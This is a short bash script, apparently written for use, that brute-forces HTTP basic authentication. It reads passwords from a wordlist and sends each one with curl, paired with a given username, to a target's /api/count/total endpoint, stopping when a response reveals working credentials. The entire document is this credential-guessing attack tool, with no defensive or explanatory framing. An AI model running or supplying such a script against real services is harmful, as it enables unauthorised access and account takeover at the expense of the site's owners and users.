#!/bin/bash
url=$1
username=$2
while read password; do
  content=$(curl -s -u $username:$password $1/api/count/total)
  if [ -z "$content" ] ; then
    continue
  else
    echo "Found credentials Username: $username and Password: $password"
    break
  fi
done < $3
